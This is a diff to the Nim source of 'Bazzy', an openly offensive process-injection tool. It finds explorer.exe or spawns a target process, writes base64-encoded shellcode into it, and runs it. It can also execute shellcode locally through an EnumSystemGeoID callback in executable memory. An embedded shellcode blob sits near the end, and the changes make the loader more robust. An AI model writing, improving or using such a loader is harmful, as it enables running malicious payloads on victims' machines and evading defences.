@@ -1,4 +1,4 @@
-import base64, osproc, unicode, strutils, strformat, os
+import base64, strutils, strformat, os
 import parseopt
 import createSuspendedProcess
 import winim/inc/tlhelp32  # Full import for process enumeration
@@ -24,23 +24,20 @@ proc getExplorerPID(): DWORD =
   if hSnapshot == INVALID_HANDLE_VALUE:
     return 0
 
-  # Get first process
+  # Iterate through processes
   if Process32FirstW(hSnapshot, processEntry):
-    # Print first process
     var procName = cast[WideCString](addr processEntry.szExeFile[0])
-  # echo "Process: ", $procName
     if ($procName).toLowerAscii() == "explorer.exe":
       result = processEntry.th32ProcessID
       found = true
-    
-    # Iterate through remaining processes
-    while Process32NextW(hSnapshot, processEntry):
-      procName = cast[WideCString](addr processEntry.szExeFile[0])
-    # echo "Process: ", $procName
-      if ($procName).toLowerAscii() == "explorer.exe":
-        result = processEntry.th32ProcessID
-        found = true
-        break
+
+    if not found:
+      while Process32NextW(hSnapshot, processEntry):
+        procName = cast[WideCString](addr processEntry.szExeFile[0])
+        if ($procName).toLowerAscii() == "explorer.exe":
+          result = processEntry.th32ProcessID
+          found = true
+          break
   
   # Clean up
   CloseHandle(hSnapshot)
@@ -53,7 +50,7 @@ proc injectShellcode(shellcode: openarray[byte], pid: DWORD = 0): void =
     let targetPID = if pid == 0: getExplorerPID() else: pid
     
     if targetPID == 0:
-        echo "Could not find explorer.exe process."
+        echo "Could not find target process."
         return
 
     # Open process with specific access rights
@@ -133,9 +130,7 @@ proc injectShellcode(shellcode: openarray[byte], pid: DWORD = 0): void =
     VirtualFreeEx(hProcess, memAddress, size, MEM_RELEASE)
     CloseHandle(hProcess)
 
-proc executeShellcode(shellcode: openarray[byte]): void = 
-
-    
+proc executeShellcode(shellcode: openarray[byte]): void =
     echo ".oO Executing the code Oo."
 
     let rPtr = VirtualAlloc(
@@ -144,15 +139,20 @@ proc executeShellcode(shellcode: openarray[byte]): void =
         MEM_COMMIT,
         PAGE_EXECUTE_READ_WRITE
     )
- # Copy Shellcode to the allocated memory section
-    copyMem(rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len))
+
+    if rPtr == nil:
+        echo "Failed to allocate memory for local execution. Error: ", GetLastError()
+        return
+
+    # Copy shellcode to the allocated memory section
+    copyMem(rPtr, unsafeAddr shellcode[0], cast[SIZE_T](shellcode.len))
 
     # Callback execution
     EnumSystemGeoID(
         16,
         0,
         cast[GEO_ENUMPROC](rPtr)
-    ) 
+    )
 proc showHelp() =
     echo """
 Bazzy - Process Injection Tool
@@ -163,8 +163,8 @@ Usage:
 Options:
     -h, --help                Show this help
     -p, --payload <base64>    Base64 encoded shellcode payload
-    -t, --target <process>    Target process name (default: explorer.exe)
-    -e, --execute            Execute shellcode directly (no process injection)
+    -t, --target <process>    Target process name to spawn from System32
+    -e, --execute             Execute shellcode directly (no process injection)
     
 Examples:
     bazzy --payload <base64string>                 # Inject into explorer.exe
@@ -194,9 +194,15 @@ while true:
             showHelp()
         of "payload", "p":
             p.next()
+            if p.kind != cmdArgument:
+                echo "Missing value for --payload"
+                quit(1)
             payload = p.key
         of "target", "t":
             p.next()
+            if p.kind != cmdArgument:
+                echo "Missing value for --target"
+                quit(1)
             targetProcess = p.key
         of "execute", "e":
             executeMode = true
@@ -218,13 +224,18 @@ ieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6
 ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlB
 idr/1Q==""" 
 
-let decodedData = decode(payload)
-echo "decoded:", decodedData
-echo decodedData.len
+let decodedData = try:
+    decode(payload)
+  except CatchableError:
+    echo "Invalid base64 payload."
+    quit(1)
+
+if decodedData.len == 0:
+    echo "Decoded payload is empty."
+    quit(1)
+
 var buf = newSeq[byte](decodedData.len)
 copyMem(addr buf[0], unsafeAddr decodedData[0], decodedData.len)
-#var buf: array[1642, byte] #If you aren't using msfvenom payloads you will probably need to modify the size here
-#copyMem(unsafeAddr(buf[0]), unsafeAddr(decodedData[0]), decodedData.len)
 
 # Process injection logic
 if executeMode:
@@ -252,9 +263,7 @@ elif targetProcess != "":
         echo ".oO Resuming process Oo."
 
         discard resumeThread(threadHandle)
-elif not executeMode:  # explicitly check we're not in execute mode
+else:
     # Default to explorer.exe injection
     echo ".oO Defaulting to explorer.exe injection Oo."
     injectShellcode(buf)
-
-echo "Success!"
